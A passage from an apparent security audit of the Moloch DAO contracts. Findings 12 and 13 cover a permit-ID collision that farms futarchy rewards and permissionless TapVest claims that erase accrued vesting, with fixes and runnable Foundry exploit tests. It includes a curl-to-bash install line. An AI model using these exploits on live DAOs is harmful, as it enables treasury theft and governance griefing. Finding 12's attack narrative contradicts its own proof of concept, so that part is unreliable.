- **Confirmed Impact:** The attacker can seize proposer ownership for a targeted proposal ID and make that proposal non-cancelable on-chain
- **Potential Follow-On Impact:** If proposal contents are known before intended opening, the attacker may also lock the snapshot earlier than planned; when `proposalTTL` is also unset, the griefered proposal can remain active indefinitely until other governance state changes occur
- **Confidentiality:** None — the code path does not expose protected data
- **Integrity:** High — the attacker can tamper with proposer attribution and the cancellation semantics of governance proposals
- **Availability:** Low — affected proposal IDs can be wedged or forced to remain live, but the entire protocol is not directly halted

#### Recommended Fix

Move `proposalThreshold` and `proposalTTL` out of optional deployment-time self-calls and into validated core initialization, so unsafe raw launches cannot exist. The raw `Summoner.summon` / `Moloch.init` path should either take explicit validated governance parameters or reject deployments that omit them.

Before:
```solidity
function init(
    string calldata orgName,
    string calldata orgSymbol,
    string calldata orgURI,
    uint16 _quorumBps,
    bool _ragequittable,
    address _renderer,
    address[] calldata initHolders,
    uint256[] calldata initShares,
    Call[] calldata initCalls
) public payable {
    require(msg.sender == SUMMONER, Unauthorized());
    ...
    for (uint256 i; i != initCalls.length; ++i) {
        (bool ok,) = initCalls[i].target.call{value: initCalls[i].value}(initCalls[i].data);
        require(ok, NotOk());
    }
}
```

After:
```solidity
function init(
    string calldata orgName,
    string calldata orgSymbol,
    string calldata orgURI,
    uint16 _quorumBps,
    bool _ragequittable,
    address _renderer,
    uint96 _proposalThreshold,
    uint64 _proposalTTL,
    address[] calldata initHolders,
    uint256[] calldata initShares,
    Call[] calldata initCalls
) public payable {
    require(msg.sender == SUMMONER, Unauthorized());
    require(_proposalThreshold != 0, NotOk());
    require(_proposalTTL != 0, NotOk());

    proposalThreshold = _proposalThreshold;
    proposalTTL = _proposalTTL;
    ...

    for (uint256 i; i != initCalls.length; ++i) {
        (bool ok,) = initCalls[i].target.call{value: initCalls[i].value}(initCalls[i].data);
        require(ok, NotOk());
    }
}
```

If an ABI change is not acceptable, add an equivalent post-init validation that rejects raw deployments unless the supplied `initCalls` set both values to safe non-zero defaults, and update the public dapp to refuse blank/zero threshold submissions.

##### Security Principle
Critical authorization invariants must be enforced in the core trust boundary, not delegated to optional wrappers or UI conventions. When a privileged state machine depends on a configuration value for access control, the contract must guarantee that value is safely initialized before any public lifecycle function becomes reachable.

##### Defense in Depth
- Make the official dapp use `SafeSummoner.safeSummon` (or equivalent validated ABI) instead of the raw `Summoner` path
- Add a one-time `governanceInitialized` flag and refuse `openProposal` / `fundFutarchy` until required governance parameters are set during deployment
- Emit an explicit deployment event containing validated threshold/TTL values so indexers and UIs can detect unsafe legacy DAOs

##### Verification Guidance
- Add a regression test proving raw deployment without a non-zero threshold and TTL now reverts
- Add a regression test proving a first caller can no longer become `proposerOf[id]` unless they satisfy the configured threshold
- Add a regression test proving `fundFutarchy` cannot auto-open proposals on uninitialized governance instances

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
forge install
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Moloch, Summoner, Call} from "../src/Moloch.sol";

contract Target {
    function setValue(uint256) external {}
}

contract ProposalFrontRunPoC is Test {
    Summoner internal summoner;
    Moloch internal dao;
    Renderer internal renderer;
    Target internal target;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 1 ether);

        summoner = new Summoner();
        renderer = new Renderer();
        target = new Target();

        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 100e18;

        // Raw summon: no init self-calls, so proposalThreshold/proposalTTL stay at zero.
        dao = summoner.summon(
            "Vuln DAO",
            "VDAO",
            "",
            5000,
            true,
            address(renderer),
            bytes32(0),
            holders,
            shares,
            new Call[](0)
        );

        // Move into a new block so openProposal() can snapshot a non-zero past supply.
        vm.roll(block.number + 1);
    }

    function test_frontRunProposalHijackAndPermanentCancelBlock() public {
        assertEq(dao.proposalThreshold(), 0);
        assertEq(dao.proposalTTL(), 0);

        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 42);
        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32(0));

        // Attacker front-runs the first open/funding transaction with 1 wei.
        vm.prank(attacker);
        dao.fundFutarchy{value: 1}(id, address(0), 1);

        // The attacker is now the recorded proposer.
        assertEq(dao.proposerOf(id), attacker);

        (, , uint256 pool, , , , ) = dao.futarchy(id);
        assertEq(pool, 1);

        // Original proposer can no longer cancel: proposerOf[id] was hijacked.
        vm.prank(alice);
        vm.expectRevert();
        dao.cancelProposal(id);

        // Even the attacker cannot cancel now because a non-zero futarchy pool exists.
        vm.prank(attacker);
        vm.expectRevert();
        dao.cancelProposal(id);
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/ProposalFrontRunPoC.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Moloch, Summoner, Call} from "../src/Moloch.sol";

contract Target {
    function setValue(uint256) external {}
}

contract ProposalFrontRunPoC is Test {
    Summoner internal summoner;
    Moloch internal dao;
    Renderer internal renderer;
    Target internal target;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 1 ether);
        summoner = new Summoner();
        renderer = new Renderer();
        target = new Target();

        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 100e18;

        dao = summoner.summon(
            "Vuln DAO",
            "VDAO",
            "",
            5000,
            true,
            address(renderer),
            bytes32(0),
            holders,
            shares,
            new Call[](0)
        );

        vm.roll(block.number + 1);
    }

    function test_frontRunProposalHijackAndPermanentCancelBlock() public {
        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 42);
        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32(0));

        vm.prank(attacker);
        dao.fundFutarchy{value: 1}(id, address(0), 1);

        assertEq(dao.proposerOf(id), attacker);

        vm.prank(alice);
        vm.expectRevert();
        dao.cancelProposal(id);

        vm.prank(attacker);
        vm.expectRevert();
        dao.cancelProposal(id);
    }
}
EOF
```
- Expected: the test file is created successfully
2. **Run the exploit test**
```bash
forge test --match-contract ProposalFrontRunPoC -vv
```
- Expected: the test passes and shows the attacker became `proposerOf(id)` while both cancellation attempts revert

##### Verification
Check that `dao.proposerOf(id)` equals the attacker address after the 1 wei `fundFutarchy` call, and that `cancelProposal(id)` reverts for both the original proposer and the attacker.

##### Outcome
The attacker gains control over the targeted proposal’s proposer slot and can force the proposal into a state where on-chain cancellation is no longer possible. This does not by itself grant arbitrary DAO execution, but it breaks the intended governance lifecycle for the affected proposal and can force the DAO to abandon or reissue governance actions.

</details>

---

## Medium

<details>
<summary><strong>12. Permit-backed IDs can be opened as proposals and farm NO-side futarchy rewards</strong></summary>

> **Review: Duplicate of KF#21 (Cantina MAJEUR-21). Severity accepted as Medium.** SECURITY.md KF#21: "Permit IDs enter proposal/futarchy lifecycle — `openProposal`, `castVote`, `fundFutarchy`, `resolveFutarchyNo` never check `isPermitReceipt[id]`." First discovered by Cantina Apex. The V1.5 assessment documents containment: bounded by `autoFutarchyCap`, requires `proposalThreshold` worth of shares, one-shot per permit ID, and promptly spending permits tombstones the ID. V2 fix: add `if (isPermitReceipt[id]) revert` guards. **Severity: Medium (per KF#21).**

**Winfunc ID:** `27`

**CVSS Score:** `6.8`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H`

**Vulnerability Type:** `CWE-863: Incorrect Authorization`

**Source Location:** `src/Moloch.sol:641:setPermit()`

**Sink Location:** `src/Moloch.sol:602:cashOutFutarchy()`

#### Summary

An attacker can open a DAO-issued permit ID as a pseudo-proposal in Moloch, leading to unauthorized NO-side futarchy reward claims on that permit-backed intent.

#### Root Cause

`setPermit()` and `proposalId()` share the same `_intentHashId` namespace, but `openProposal()`, `castVote()`, `fundFutarchy()`, and `resolveFutarchyNo()` never reject IDs flagged by `isPermitReceipt`. While a permit remains unspent, a shareholder can therefore open the permit ID as a proposal, attach or auto-create a futarchy pool on that same ID, mint NO receipts, and resolve the NO side once the pseudo-proposal is `Defeated` or `Expired`.

#### Impact

###### Confirmed Impact
A shareholder can claim NO-side futarchy rewards on a permit-backed ID even though the ID was supposed to represent only a permit, not a governance proposal. Under the default auto-futarchy reward path, the NO-side cashout mints loot for the attacker.

###### Potential Follow-On Impact
If ragequit is enabled and the DAO treasury is funded, the attacker can burn the unauthorized loot for real treasury assets. Even without immediate withdrawal, the minted loot dilutes governance and economic claims while the original permit can still be spent later unless it is promptly revoked or consumed.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:641](../src/Moloch.sol#L641)**

   ```solidity
   uint256 tokenId = _intentHashId(op, to, value, data, nonce);
   ```

   Permit issuance reuses the same ID namespace as proposals, so a pending permit can later be addressed as a proposal ID.

2. **[src/Moloch.sol:642](../src/Moloch.sol#L642)**

   ```solidity
   isPermitReceipt[tokenId] = true;
   ```

   The contract marks the ID as a permit, but no proposal or futarchy entrypoint rejects permit-backed IDs.

3. **[src/Moloch.sol:278](../src/Moloch.sol#L278)**

   ```solidity
   function openProposal(uint256 id) public {
   ```

   A shareholder can open that permit ID as a pseudo-proposal because there is no `isPermitReceipt[id]` guard.

4. **[src/Moloch.sol:336](../src/Moloch.sol#L336)**

   ```solidity
   F.pool += amt;
   ```

   Auto-futarchy or public funding can attach a reward pool to the permit-backed ID even though it is not a real proposal intent.

5. **[src/Moloch.sol:384](../src/Moloch.sol#L384)**

   ```solidity
   uint256 rid = _receiptId(id, support);
   ```

   The attacker can mint NO-side vote receipts for the permit-backed ID by voting against the pseudo-proposal.

6. **[src/Moloch.sol:573](../src/Moloch.sol#L573)**

   ```solidity
   function resolveFutarchyNo(uint256 id) public {
   ```

   Once the pseudo-proposal is `Defeated` or `Expired`, anyone can resolve the NO side because permit IDs are not excluded from NO resolution.

7. **[src/Moloch.sol:602](../src/Moloch.sol#L602)**

   ```solidity
   _payout(F.rewardToken, msg.sender, payout);
   ```

   The NO receipt holder can cash out the attached futarchy reward pool.

8. **[src/Moloch.sol:995](../src/Moloch.sol#L995)**

   ```solidity
   loot.mintFromMoloch(to, amount);
   ```

   With the default auto-futarchy reward token, the NO-side cashout mints loot that can later be ragequit for treasury assets.

#### Exploit Analysis

##### Attack Narrative
The attacker is a permit recipient who knows the permitted call tuple `(op, to, value, data, nonce)`. Because `proposalId()` and `setPermit()` derive the same `_intentHashId`, the attacker can reuse the permit’s token ID as a proposal ID, open it through `openProposal()`, and obtain YES vote receipts for that same numeric ID through `castVote()`.

The key break happens when the attacker later calls `spendPermit()`. That function does not treat permit-backed IDs as distinct from proposals and it does not verify proposal success before resolving futarchy. If a futarchy market exists for that ID, `spendPermit()` directly calls `_resolveFutarchyYes(tokenId)`, making the YES receipts winning receipts even when the pseudo-proposal is still Active or already Defeated. The attacker can then use `cashOutFutarchy()` to receive the reward and, under the default auto-futarchy path, mint loot that can be monetized further.

##### Prerequisites
- **Attacker Control/Position:** The attacker holds a DAO-issued permit for a specific intent and either holds some voting power or can obtain YES receipts from a collaborator.
- **Required Access/Placement:** Permit holder / DAO member, or permit holder plus a small voting collaborator.
- **User Interaction:** None.
- **Privileges/Configuration Required:** The DAO must have issued a permit for the target intent. Direct economic extraction requires either auto-futarchy to be enabled or a futarchy market/pool to exist on the same shared ID; the default auto-futarchy reward path mints loot when `rewardToken == address(0)`.
- **Knowledge Required:** The attacker must know the permit parameters `(op, to, value, data, nonce)`; the permit holder inherently has them.
- **Attack Complexity:** Medium — the attacker needs a valid permit and a live futarchy reward path, but once those conditions exist the exploit is deterministic and does not require winning governance, breaking cryptography, or exploiting reentrancy.

##### Attack Steps
1. The DAO grants a permit via `setPermit(op, to, value, data, nonce, attacker, count)`.
2. The attacker computes the shared ID using `proposalId(op, to, value, data, nonce)` and calls `openProposal(id)` on that permit-backed ID.
3. If auto-futarchy is configured, `openProposal(id)` earmarks a reward pool on `futarchy[id]`; otherwise the attacker or third parties use `fundFutarchy(id, ...)`.
4. The attacker or a collaborator calls `castVote(id, 1)` to mint YES receipts for the same ID.
5. Even if `state(id)` is `Active` or `Defeated`, the attacker calls `spendPermit(op, to, value, data, nonce)`.
6. `spendPermit()` executes the permit and force-resolves the futarchy market to YES through `_resolveFutarchyYes(id)`.
7. The holder of the YES receipts calls `cashOutFutarchy(id, amount)` to receive the reward.
8. If the reward token is loot/shares and economic conversion is available, the attacker monetizes that reward, for example by `ragequit()`ing the minted loot against the treasury when enabled.

##### Impact Breakdown
- **Confirmed Impact:** Unauthorized payout or minting from a futarchy market can be triggered through the permit execution path even when the associated pseudo-proposal never satisfied governance success conditions.
- **Potential Follow-On Impact:** Depending on the configured reward token and DAO settings, the attacker may convert the unauthorized payout into treasury extraction, governance dilution, or transfer/sale of the minted asset. Treasury withdrawal specifically depends on downstream mechanisms such as ragequit being enabled and the treasury holding withdrawable assets.
- **Confidentiality:** None — the exploit does not expose protected data.
- **Integrity:** High — a permit can be upgraded into an unauthorized claim on futarchy rewards and can mutate governance/economic state beyond the intended capability.
- **Availability:** High — successful exploitation can remove or dilute economic resources that legitimate DAO participants rely on.

#### Recommended Fix

Reserve permit IDs from the proposal/futarchy lifecycle. The minimal fix is to add `if (isPermitReceipt[id]) revert Unauthorized();` to every raw-ID governance entrypoint that can operate on proposal state: `openProposal`, `castVote`, `cancelVote`, `cancelProposal`, `fundFutarchy`, and `resolveFutarchyNo`. A stronger long-term fix is to domain-separate proposal IDs and permit IDs so the two capabilities can never collide.

**Before:**
```solidity
function setPermit(...) public payable onlyDAO {
    uint256 tokenId = _intentHashId(op, to, value, data, nonce);
    isPermitReceipt[tokenId] = true;
    ...
}

function openProposal(uint256 id) public {
    ...
}

function resolveFutarchyNo(uint256 id) public {
    ...
}
```

**After (minimum hardening):**
```solidity
function openProposal(uint256 id) public {
    if (isPermitReceipt[id]) revert Unauthorized();
    ...
}

function castVote(uint256 id, uint8 support) public {
    if (isPermitReceipt[id]) revert Unauthorized();
    ...
}

function fundFutarchy(uint256 id, address token, uint256 amount) public payable {
    if (isPermitReceipt[id]) revert Unauthorized();
    ...
}

function resolveFutarchyNo(uint256 id) public {
    if (isPermitReceipt[id]) revert Unauthorized();
    ...
}
```

##### Security Principle
Different authorization domains must not share unguarded identifiers. A permit should not be reinterpret-able as a proposal or futarchy market unless every lifecycle function explicitly consents to that reuse.

##### Defense in Depth
- Domain-separate `_intentHashId` for proposals and permits.
- Add regression tests asserting permit IDs cannot be opened, voted, funded, or NO-resolved as proposals.
- Revoke or promptly spend stale permits in futarchy-enabled DAOs to close the attack window operationally.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd $(git rev-parse --show-toplevel)
forge build
```

##### Runnable PoC
Save the following as `test/PermitNamespaceCollision.t.sol` and run `forge test --match-test test_PermitIdCanFarmNoSideFutarchyRewards -vv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch, Shares, Loot, Call} from "../src/Moloch.sol";

contract PermitTarget {
    uint256 public value;
    function setValue(uint256 newValue) external { value = newValue; }
}

contract PermitNamespaceCollisionTest is Test {
    Moloch internal dao;
    Shares internal shares;
    Loot internal loot;
    PermitTarget internal target;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    address internal charlie = address(0xCAFE);
    bytes32 internal constant NONCE = bytes32(uint256(1));

    function setUp() public {
        dao = new Moloch();
        target = new PermitTarget();

        address[] memory initHolders = new address[](3);
        initHolders[0] = alice;
        initHolders[1] = bob;
        initHolders[2] = charlie;

        uint256[] memory initShares = new uint256[](3);
        initShares[0] = 60e18;
        initShares[1] = 39e18;
        initShares[2] = 1e18;

        dao.init("PermitDAO", "PMT", "", 0, true, address(0), initHolders, initShares, new Call[](0));
        shares = dao.shares();
        loot = dao.loot();

        vm.startPrank(address(dao));
        dao.setQuorumBps(0);
        dao.setMinYesVotesAbsolute(2e18);
        dao.setAutoFutarchy(1000, 0);
        bytes memory data = abi.encodeCall(PermitTarget.setValue, (123));
        dao.setPermit(0, address(target), 0, data, NONCE, charlie, 1);
        vm.stopPrank();

        vm.deal(address(dao), 11 ether);
        vm.roll(block.number + 1);
    }

    function test_PermitIdCanFarmNoSideFutarchyRewards() public {
        bytes memory data = abi.encodeCall(PermitTarget.setValue, (123));
        uint256 id = dao.proposalId(0, address(target), 0, data, NONCE);

        vm.startPrank(charlie);
        dao.openProposal(id);
        dao.castVote(id, 0);
        assertEq(uint256(dao.state(id)), 4);

        dao.resolveFutarchyNo(id);
        (,,, bool resolved, uint8 winner,,) = dao.futarchy(id);
        assertTrue(resolved);
        assertEq(winner, 0);

        uint256 noReceiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
        uint256 receiptBal = dao.balanceOf(charlie, noReceiptId);
        dao.cashOutFutarchy(id, receiptBal);
        assertEq(loot.balanceOf(charlie), 10e18);

        uint256 before = charlie.balance;
        address[] memory tokens = new address[](1);
        tokens[0] = address(0);
        dao.ragequit(tokens, 0, 10e18);
        assertEq(charlie.balance - before, 1 ether);

        dao.spendPermit(0, address(target), 0, data, NONCE);
        assertEq(target.value(), 123);
        vm.stopPrank();
    }
}
```

##### Steps
1. Save the PoC test file above.
- Expected: the repository still compiles successfully.
2. Run the targeted Foundry test.
```bash
forge test --match-test test_PermitIdCanFarmNoSideFutarchyRewards -vv
```
- Expected: the test passes.

##### Verification
Confirm the attacker opens the permit ID as a proposal, votes NO, resolves the NO side, cashes out 10e18 loot, converts it into 1 ETH via `ragequit()`, and then still spends the original permit successfully afterward.

##### Outcome
A pending permit ID can be abused as a proposal/futarchy ID long enough to mint and monetize NO-side rewards before the permit is finally consumed.

</details>

---

<details>
<summary><strong>13. Permissionless partial tap claims permanently burn accrued vesting</strong></summary>

> **Review: Duplicate — same root cause as #4 (Certora FV L-01, tap forfeiture class). Severity adjusted to Low.** See #4 review. This is the same TapVest partial-claim forfeiture documented by Certora, webrainsec, and Grimoire. The permissionless-claim angle is a sharper framing but the root cause is acknowledged as intentional Moloch exit-rights design. Not a Moloch.sol core finding — targets `TapVest.sol`. **Severity: Low (acknowledged design tradeoff).**

**Winfunc ID:** `1`

**CVSS Score:** `6.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-682: Incorrect Calculation`

**Source Location:** `src/peripheral/TapVest.sol:59:claim()`

**Sink Location:** `src/peripheral/TapVest.sol:83:claim()`

#### Summary

An unauthenticated caller can trigger a partial tap claim in the tap-vesting module, leading to permanent loss of already-accrued vesting for the configured beneficiary.

#### Root Cause

`TapVest.claim()` computes the payout as `min(owed, allowance, daoBalance)` but then unconditionally sets `tap.lastClaim = block.timestamp` before pulling and forwarding funds. When `claimed < owed` because the DAO balance or allowance is temporarily insufficient, the contract does not preserve the unpaid remainder in storage and does not restrict who may trigger the claim. As a result, any caller can checkpoint away previously accrued-but-unpaid vesting during a partial-liquidity window.

#### Impact

###### Confirmed Impact
Already-accrued vesting can be permanently destroyed whenever a partial claim succeeds. After the timestamp is advanced, future `claimable()`/`pending()` calculations start from the new `lastClaim`, so the beneficiary can only recover newly accrued vesting, not the unpaid historical portion.

###### Potential Follow-On Impact
An attacker can grief an ops team or service provider by repeatedly claiming during low-balance or nearly exhausted-allowance windows, disrupting expected payroll or runway. In DAO deployments where tap payouts fund critical operations, this can cascade into operational delays or governance disputes, though the secondary business impact depends on the DAO’s treasury management and off-chain arrangements.

#### Source-to-Sink Trace

1. **[src/peripheral/TapVest.sol:59](../src/peripheral/TapVest.sol#L59)**

   ```solidity
   function claim(address dao) public returns (uint256 claimed) {
   ```

   `claim` is a public, permissionless entrypoint. Any external caller chooses the target DAO and, critically, the timing of the claim transaction.

2. **[src/peripheral/TapVest.sol:65](../src/peripheral/TapVest.sol#L65)**

   ```solidity
   elapsed = uint64(block.timestamp) - tap.lastClaim;
   ```

   The attacker-controlled call timing is converted directly into elapsed vesting time since the last successful claim.

3. **[src/peripheral/TapVest.sol:68](../src/peripheral/TapVest.sol#L68)**

   ```solidity
   uint256 owed = uint256(tap.ratePerSec) * uint256(elapsed);
   ```

   The contract calculates the full accrued vesting owed for the elapsed period.

4. **[src/peripheral/TapVest.sol:78](../src/peripheral/TapVest.sol#L78)**

   ```solidity
   claimed = owed < allowance ? owed : allowance; if (claimed > daoBalance) claimed = daoBalance;
   ```

   The payout is reduced to the currently available amount, creating a partial-claim state whenever `claimed < owed`.

5. **[src/peripheral/TapVest.sol:83](../src/peripheral/TapVest.sol#L83)**

   ```solidity
   tap.lastClaim = uint64(block.timestamp);
   ```

   SINK: the contract advances the vesting checkpoint to the current timestamp even when only a partial amount was paid, permanently discarding the unpaid remainder because no debt accumulator exists.

#### Exploit Analysis

##### Attack Narrative
An arbitrary on-chain attacker monitors DAOs using `TapVest` and waits for a moment when the beneficiary has accrued meaningful vesting but the DAO’s current spendable amount is temporarily constrained by treasury balance or allowance. Because `claim(address dao)` is intentionally permissionless, the attacker can submit a single transaction calling `claim` before the beneficiary or DAO reacts.

The contract pays only the currently available amount, but it still advances `lastClaim` to the current timestamp. That state transition irreversibly erases the unpaid portion of the beneficiary’s already-earned vesting. Even if the DAO is refilled moments later, subsequent claims only pay for time elapsed after the attacker’s transaction.

##### Prerequisites
- **Attacker Control/Position:** Any EOA or contract capable of sending a public transaction
- **Required Access/Placement:** Unauthenticated user
- **User Interaction:** None
- **Privileges/Configuration Required:** A tap must be configured, some vesting time must have elapsed, and `0 < min(allowance, daoBalance) < owed` must hold at claim time
- **Knowledge Required:** DAO address and observable tap state; the attacker can infer the opportunity from public chain state and/or `claimable()`
- **Attack Complexity:** Low — the attacker only needs to time a public `claim()` call during a partial-liquidity or partial-allowance window

##### Attack Steps
1. Identify a DAO with an active `TapVest` configuration and accrued vesting.
2. Wait until the beneficiary is owed more than the DAO can currently pay, while the available amount remains non-zero.
3. Call `TapVest.claim(dao)` from any address.
4. Let the DAO replenish funds or allowance and observe that previously accrued vesting cannot be recovered.

##### Impact Breakdown
- **Confirmed Impact:** Permanent destruction of accrued vesting whenever a partial claim succeeds, plus permissionless griefing against the beneficiary.
- **Potential Follow-On Impact:** Disrupted contributor payroll, runway distortion, or operational denial for teams depending on tap payouts; these downstream effects depend on how the DAO uses the tap in practice.
- **Confidentiality:** None — the bug does not expose secret data.
- **Integrity:** Low — vesting accounting is incorrectly mutated and beneficiary entitlements are reduced without authorization.
- **Availability:** Low — the beneficiary loses access to already-accrued funds and cannot recover them later.

#### Recommended Fix

Preserve unpaid accrued vesting whenever a claim is capped below `owed`. The cleanest approach is to track carry-over debt explicitly and only clear the portion that was actually paid, instead of resetting the accrual base with no remainder bookkeeping.

Before:
```solidity
uint256 owed = uint256(tap.ratePerSec) * uint256(elapsed);
...
claimed = owed < allowance ? owed : allowance;
if (claimed > daoBalance) claimed = daoBalance;
if (claimed == 0) revert NothingToClaim();

tap.lastClaim = uint64(block.timestamp);
IMoloch(dao).spendAllowance(token, claimed);
```

After:
```solidity
struct TapConfig {
    address token;
    address beneficiary;
    uint128 ratePerSec;
    uint64 lastClaim;
    uint128 unpaidCarry;
}

function claim(address dao) public returns (uint256 claimed) {
    TapConfig storage tap = taps[dao];
    if (tap.ratePerSec == 0) revert NotConfigured();

    uint64 elapsed;
    unchecked {
        elapsed = uint64(block.timestamp) - tap.lastClaim;
    }

    uint256 owed = uint256(tap.unpaidCarry) + uint256(tap.ratePerSec) * uint256(elapsed);
    if (owed == 0) revert NothingToClaim();

    uint256 allowance = IMoloch(dao).allowance(tap.token, address(this));
    uint256 daoBalance = tap.token == address(0) ? dao.balance : balanceOf(tap.token, dao);

    claimed = owed < allowance ? owed : allowance;
    if (claimed > daoBalance) claimed = daoBalance;
    if (claimed == 0) revert NothingToClaim();

    tap.lastClaim = uint64(block.timestamp);
    tap.unpaidCarry = uint128(owed - claimed);

    IMoloch(dao).spendAllowance(tap.token, claimed);
    ...
}
```

If storage changes are undesirable, an alternative is to revert whenever `claimed < owed` rather than silently burning accrued vesting. That is stricter UX, but it still preserves correctness.

##### Security Principle
Accounting state must reflect economic reality. If a beneficiary has earned value that cannot be paid immediately, the contract must either preserve that debt for later settlement or refuse the state transition; it must not silently erase the claimable entitlement.

##### Defense in Depth
- Emit a dedicated event when `claimed < owed` so off-chain monitoring can detect partial-liquidity situations and alert operators.
- Add an optional mode that restricts claim initiation to the beneficiary or reverts on partial claims if a DAO prefers stronger protection against third-party griefing.

##### Verification Guidance
- Add a regression test where `owed > daoBalance > 0`, a third party triggers `claim()`, the DAO is refilled, and the beneficiary can still recover the unpaid remainder later.
- Add a regression test where `owed > allowance > 0`, governance replenishes allowance, and the beneficiary ultimately receives the full historical accrual.
- Keep the formal invariant from `certora/specs/DAICO.spec` requiring that consumed claim time never exceed paid-for claim time, and verify it now passes.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd $(git rev-parse --show-toplevel)
forge build
```

##### Runnable PoC
```bash
cat > test/TapVestPartialClaimForfeiture.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {TapVest} from "../src/peripheral/TapVest.sol";

contract TapVestPartialClaimForfeitureTest is Test {
    SafeSummoner internal safe;
    TapVest internal tap;

    address internal alice = address(0xA11CE);
    address internal beneficiary = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("main");
        safe = new SafeSummoner();
        tap = new TapVest();
    }

    function _deployWithTap(bytes32 salt, uint128 rate, uint256 budget)
        internal
        returns (address dao)
    {
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 100e18;

        dao = safe.predictDAO(salt, holders, shares);

        Call[] memory extra = new Call[](2);
        extra[0] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(tap), address(0), budget))
        );
        extra[1] = Call(
            address(tap),
            0,
            abi.encodeCall(tap.configure, (address(0), beneficiary, rate))
        );

        SafeSummoner.SafeConfig memory c;
        c.proposalThreshold = 1e18;
        c.proposalTTL = 7 days;

        address deployed = safe.safeSummon(
            "TapDAO", "TAP", "", 1000, true, address(0), salt, holders, shares, c, extra
        );
        require(deployed == dao, "bad dao");

        vm.deal(dao, 100 ether);
    }

    function test_PermissionlessPartialClaimBurnsAccruedVesting() public {
        uint128 rate = 1e18 / uint128(1 days); // ~1 ETH/day
        address dao = _deployWithTap(bytes32(uint256(111)), rate, 100e18);

        // Let ~10 ETH accrue.
        vm.warp(block.timestamp + 10 days);

        // DAO becomes temporarily underfunded, but still has some balance.
        vm.deal(dao, 0.5 ether);

        // Any attacker can trigger the partial claim.
        address attacker = address(0xCAFE);
        uint256 before = beneficiary.balance;
        vm.prank(attacker);
        tap.claim(dao);
        uint256 firstClaim = beneficiary.balance - before;
        assertEq(firstClaim, 0.5 ether);

        // Treasury is replenished later.
        vm.deal(dao, 100 ether);

        // Previously accrued vesting is already gone because lastClaim was reset.
        assertEq(tap.claimable(dao), 0);
        assertEq(tap.pending(dao), 0);

        // After one more day, beneficiary only receives new accrual (~1 ETH),
        // not the ~9.5 ETH that was already earned but unpaid.
        vm.warp(block.timestamp + 1 days);
        before = beneficiary.balance;
        tap.claim(dao);
        uint256 secondClaim = beneficiary.balance - before;
        assertApproxEqAbs(secondClaim, 1e18, 1e15);

        uint256 totalReceived = firstClaim + secondClaim;
        assertApproxEqAbs(totalReceived, 1.5e18, 1e15);
        // A correct implementation would allow recovery of roughly 10.5 ETH here.
        assertLt(totalReceived, 3e18);
    }
}
EOF

forge test --match-test test_PermissionlessPartialClaimBurnsAccruedVesting -vv
```

##### Steps
1. **Create the PoC test file from the repository root**
- Expected: `test/TapVestPartialClaimForfeiture.t.sol` is written successfully.
2. **Run the targeted test**
```bash
forge test --match-test test_PermissionlessPartialClaimBurnsAccruedVesting -vv
```
- Expected: the test passes and shows that only ~1.5 ETH is ever received across the attacker-triggered partial claim plus the later post-refill claim.
3. **Compare with the expected no-bug outcome**
- Expected: comments and assertions show that, absent the bug, the beneficiary should have recovered roughly 10.5 ETH after the DAO was refilled.

##### Verification
Confirm that immediately after the attacker-triggered partial claim and treasury refill, both `tap.claimable(dao)` and `tap.pending(dao)` are `0`, proving the previously accrued amount is no longer tracked. Then confirm that the next successful claim after one day only pays about `1 ETH`, demonstrating that only fresh accrual remains.

##### Outcome
The attacker does not need to steal treasury assets to succeed. By calling a permissionless claim while available funds are positive but below the amount owed, the attacker permanently destroys the beneficiary’s previously accrued vesting and forces all future claims to start from the reset timestamp.

</details>

---

<details>
<summary><strong>14. Tribute escrow accepts fake ERC20 funding and can pay proposers for undelivered tributes</strong></summary>

